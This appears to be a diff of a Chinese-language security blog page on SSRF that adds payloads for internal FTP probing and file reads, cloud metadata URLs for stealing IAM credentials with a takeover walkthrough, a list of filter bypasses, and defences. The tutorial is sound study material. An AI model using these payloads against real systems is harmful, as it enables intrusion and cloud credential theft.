-<li>@绕过；例如：<a target="_blank" rel="noopener" href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></li>
-<li>添加端口号；例如：http:127.0.0.1:8080</li>
-<li>短地址；例如：<a target="_blank" rel="noopener" href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></li>
+<h2 id="4-5-ftp-协议利用"><a href="#4-5-ftp-协议利用" class="headerlink" title="4.5 ftp 协议利用"></a>4.5 ftp 协议利用</h2><p><code>ftp://</code> 协议主要用于探测内网端口或进行文件操作。在 SSRF 中，如果后端支持 FTP 协议（如 PHP 的 <code>curl</code> 扩展），可以利用它来探测内网存活服务或读取 FTP 服务器上的文件。</p>
+<h3 id="4-5-1-内网端口探测"><a href="#4-5-1-内网端口探测" class="headerlink" title="4.5.1 内网端口探测"></a>4.5.1 内网端口探测</h3><p>通过计算响应时间或查看错误信息，可以探测内网主机开放的端口。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=ftp://127.0.0.1:22<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-5-2-读取文件与目录列表"><a href="#4-5-2-读取文件与目录列表" class="headerlink" title="4.5.2 读取文件与目录列表"></a>4.5.2 读取文件与目录列表</h3><p>如果内网存在 FTP 服务且允许匿名访问（或已知账号密码），可以读取文件或列出目录。</p>
+<p><strong>1. 匿名访问列出目录</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=ftp://127.0.0.1:21/<br></code></pre></td></tr></table></figure>
+
+<p><strong>2. 读取指定文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=ftp://127.0.0.1:21/flag.txt<br></code></pre></td></tr></table></figure>
+
+<p><strong>3. 带凭证访问</strong></p>
+<p>格式：<code>ftp://user:password@ip:port/path</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://localhost/ssrf.php?url=ftp://admin:123456@10.10.10.5:21/secret.txt<br></code></pre></td></tr></table></figure>
+
+<h2 id="4-6-云主机元数据读取"><a href="#4-6-云主机元数据读取" class="headerlink" title="4.6 云主机元数据读取"></a>4.6 云主机元数据读取</h2><p>云服务商（如阿里云、AWS、GCP等）通常提供元数据服务（Metadata Service），用于查询当前实例的配置信息。如果存在SSRF漏洞，攻击者可以访问这些接口获取敏感信息（如临时凭证、AccessKey、Token等），进而控制云资源。</p>
+<h3 id="4-6-1-常用元数据地址"><a href="#4-6-1-常用元数据地址" class="headerlink" title="4.6.1 常用元数据地址"></a>4.6.1 常用元数据地址</h3><p><strong>1. AWS (Amazon Web Services) &#x2F; 阿里云 (Alibaba Cloud) &#x2F; 腾讯云</strong></p>
+<ul>
+<li><strong>地址</strong>: <code>http://169.254.169.254/latest/meta-data/</code></li>
+<li><strong>利用</strong>:<ul>
+<li>获取实例ID: <code>http://169.254.169.254/latest/meta-data/instance-id</code></li>
+<li>获取IAM角色名称: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
+<li>获取临时凭证 (AccessKey&#x2F;SecretKey&#x2F;Token): <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;ROLE_NAME&gt;</code></li>
+<li>获取用户数据 (User Data): <code>http://169.254.169.254/latest/user-data/</code> (可能包含脚本或密码)</li>
+</ul>
+</li>
+</ul>
+<p><strong>2. 阿里云 (Alibaba Cloud) 额外地址</strong></p>
+<ul>
+<li><strong>地址</strong>: <code>http://100.100.100.200/latest/meta-data/</code> (阿里云经典网络或VPC均可尝试)</li>
+<li><strong>利用</strong>:<ul>
+<li>获取敏感信息: <code>http://100.100.100.200/latest/meta-data/ram/security-credentials/&lt;ROLE_NAME&gt;</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>3. Google Cloud Platform (GCP)</strong></p>
+<ul>
+<li><strong>地址</strong>: <code>http://metadata.google.internal/computeMetadata/v1/</code></li>
+<li><strong>注意</strong>: GCP通常需要添加请求头 <code>Metadata-Flavor: Google</code>，普通的SSRF（无头控制）较难利用，但如果支持CRLF注入头部或未校验头部则可利用。</li>
+<li><strong>利用</strong>:<ul>
+<li>获取SSH公钥: <code>http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys?alt=json</code></li>
+<li>获取Access Token: <code>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>4. Microsoft Azure</strong></p>
+<ul>
+<li><strong>地址</strong>: <code>http://169.254.169.254/metadata/instance?api-version=2021-02-01</code></li>
+<li><strong>注意</strong>: Azure通常需要添加请求头 <code>Metadata: true</code>。</li>
+</ul>
+<p><strong>5. DigitalOcean</strong></p>
+<ul>
+<li><strong>地址</strong>: <code>http://169.254.169.254/metadata/v1/</code></li>
+</ul>
+<h3 id="4-6-2-利用示例"><a href="#4-6-2-利用示例" class="headerlink" title="4.6.2 利用示例"></a>4.6.2 利用示例</h3><p>假设目标存在SSRF漏洞 <code>http://target.com/ssrf.php?url=...</code></p>
+<ol>
+<li><p><strong>探测是否存在元数据服务</strong><br>访问 <code>http://target.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/</code><br>如果返回目录列表（如 <code>ami-id</code>, <code>iam/</code>, <code>instance-id</code> 等），则说明存在。</p>
+</li>
+<li><p><strong>获取凭证</strong><br>访问 <code>http://target.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> 获取角色名称（例如 <code>admin-role</code>）。<br>访问 <code>http://target.com/ssrf.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role</code> 获取JSON格式的 <code>AccessKeyId</code>, <code>SecretAccessKey</code>, <code>Token</code>。</p>
+</li>
+<li><p><strong>本地利用凭证接管</strong><br>使用获取的凭证配置本地 CLI 工具（如 <code>aws-cli</code> 或 <code>aliyun-cli</code>），即可操作该云账号下的资源。</p>
+</li>
 </ol>
-<p>推荐：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/tools/dwz.aspx%E3%80%81https://dwz.cn/">http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/</a></p>
-<ol start="4">
-<li>可以指向任意ip的域名；例如：xip.io</li>
-<li>ip地址转换成进制来访问；例如：192.168.0.1&#x3D;3232235521（十进制）</li>
-<li>非HTTP协议；</li>
-<li>DNS Rebinding；</li>
-<li>利用[::]绕过；例如：http:&#x2F;&#x2F;[::]:80 &#x3D;&#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1:80</a></li>
-<li>句号绕过；例如：127。0。0。1 &#x3D;&#x3D; 127.0.0.1</li>
-<li>利用302跳转绕过；</li>
+<h1 id="五、ssrf-常见绕过方式"><a href="#五、ssrf-常见绕过方式" class="headerlink" title="五、ssrf 常见绕过方式"></a>五、ssrf 常见绕过方式</h1><h2 id="5-1-常用绕过方法"><a href="#5-1-常用绕过方法" class="headerlink" title="5.1 常用绕过方法"></a>5.1 常用绕过方法</h2><ol>
+<li><p>@绕过；例如：<a target="_blank" rel="noopener" href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
+</li>
+<li><p>添加端口号；例如：http:127.0.0.1:8080</p>
+</li>
+<li><p>短地址；例如：<a target="_blank" rel="noopener" href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
+<p> 推荐：<a target="_blank" rel="noopener" href="http://tool.chinaz.com/tools/dwz.aspx%E3%80%81https://dwz.cn/">http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/</a></p>
+</li>
+<li><p>可以指向任意ip的域名；例如：xip.io</p>
+</li>
+<li><p>ip地址转换成进制来访问；例如：192.168.0.1&#x3D;3232235521（十进制）</p>
+</li>
+<li><p>非HTTP协议；</p>
+</li>
+<li><p>DNS重绑定；</p>
+</li>
+<li><p>利用[::]绕过；例如：http:&#x2F;&#x2F;[::]:80 &#x3D;&#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1:80</a></p>
+</li>
+<li><p>句号绕过；例如：127。0。0。1 &#x3D;&#x3D; 127.0.0.1</p>
+</li>
+<li><p>利用302跳转绕过；</p>
+</li>
 </ol>
 <h2 id="5-2-常见限制"><a href="#5-2-常见限制" class="headerlink" title="5.2 常见限制"></a>5.2 常见限制</h2><ol>
 <li>限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</li>
@@ -466,7 +561,9 @@
 <ol start="2">
 <li>限制请求IP不为内网地址</li>
 </ol>
-<p>当不允许ip为内网地址时：<br>    （1）采取短网址绕过<br>    （2）采取特殊域名<br>    （3）采取进制转换</p>
+<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过</p>
+<p>（2）采取特殊域名</p>
+<p>（3）采取进制转换</p>
 <ol start="3">
 <li>限制请求只为http协议</li>
 </ol>
@@ -479,10 +576,35 @@
 <p>然后可能存在漏洞的位置写如 vps 监听的 ip 和端口</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?url=http://127.0.0.1:20044<br></code></pre></td></tr></table></figure>
 
-<p>也可以通过 dnslog 平台实现<a target="_blank" rel="noopener" href="https://dig.pm/%E3%80%81http://dnslog.cn/">https://dig.pm/、http://dnslog.cn/</a></p>
+<p>也可以通过 dnslog 平台实现<a target="_blank" rel="noopener" href="https://dig.pm/">https://dig.pm/</a>、<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<h1 id="七、SSRF-防御方案"><a href="#七、SSRF-防御方案" class="headerlink" title="七、SSRF 防御方案"></a>七、SSRF 防御方案</h1><p>ssrf 的防御思路通常有以下几种：</p>
+<ol>
+<li>限制危险协议，仅允许必要的协议，如 http、https；禁止危险协议，如 file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F;、dict:&#x2F;&#x2F;；</li>
+<li>设置 ip 黑名单，禁止访问私钥 ip 端和 保留地址</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>限制请求的端口为 http 常用的端口，如：80、443、8080、8090；</li>
+</ol>
+<h1 id="八、针对绕过方式的防御方案"><a href="#八、针对绕过方式的防御方案" class="headerlink" title="八、针对绕过方式的防御方案"></a>八、针对绕过方式的防御方案</h1><ol>
+<li><p>DNS重绑定绕过</p>
+<p> 防御方案的设计核心在于 <strong>固定解析结果，不给攻击者二次解析的机会。</strong></p>
+<p> 对于可能存在ssrf漏洞的点对输入的 url 的 hostname 进行 DNS 解析，校验ip地址是否属于合法区域地址，禁止访问私有地址段、环回地址和特殊用途的地址（如云平台元数据地址）。</p>
+</li>
+<li><p>302 跳转</p>
+<p> 防御方案的设计核心在于<strong>将重定向过程受控化，确保每一次跳转都经过与初始请求同等强度的校验。</strong></p>
+<ol>
+<li>禁用自动重定向</li>
+<li>自定义重定向策略（Hook&#x2F;Interceptor）：对Location字段重复进行URL解析和IP地址段校验，保证最后跳转地址的合法有效。</li>
+<li>网络层出口限制（深度防御）</li>
+</ol>
+</li>
+</ol>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
 <li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/miruier/p/13907150.html">https://www.cnblogs.com/miruier/p/13907150.html</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">https://www.freebuf.com/articles/web/333318.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/5847">https://xz.aliyun.com/news/5847</a></li>
 </ol>
 
                 
@@ -517,9 +639,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/SSRF/" class="print-no-link">#SSRF</a>
-      
         <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" class="print-no-link">#基础漏洞</a>
+      
+        <a href="/tags/SSRF/" class="print-no-link">#SSRF</a>
       
     </div>
   
@@ -550,7 +672,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年8月17日</div>
+          <div>2025年12月31日</div>
         </div>
       
       
